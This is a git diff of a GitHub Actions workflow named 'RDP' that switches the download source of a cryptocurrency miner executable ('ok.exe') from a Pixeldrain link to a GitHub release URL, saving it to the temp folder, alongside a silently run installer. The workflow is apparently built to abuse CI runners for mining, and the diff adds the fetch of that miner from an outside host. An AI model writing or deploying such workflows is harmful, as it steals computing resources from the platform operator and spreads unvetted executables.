@@ -1,4 +1,4 @@
-name: RDP
+ name: RDP
 
 on:
   workflow_dispatch:
@@ -77,12 +77,12 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Download Miner from Pixeldrain ---
-      - name: Download Miner from Pixeldrain
+      # --- Download Miner from GitHub Release ---
+      - name: Download Miner from GitHub Release
         run: |
-          $url = "https://pixeldrain.com/api/file/dYQsWt5c"
+          $url = "https://github.com/frbrosss/RDP/releases/download/v.1/ok.exe"
           $output = "$env:TEMP\ok.exe"
-          curl.exe -L -o $output $url
+          Invoke-WebRequest -Uri $url -OutFile $output
           Write-Host "Miner downloaded to $output"
 
       # --- Check Downloaded File (Hex dump for verification) ---
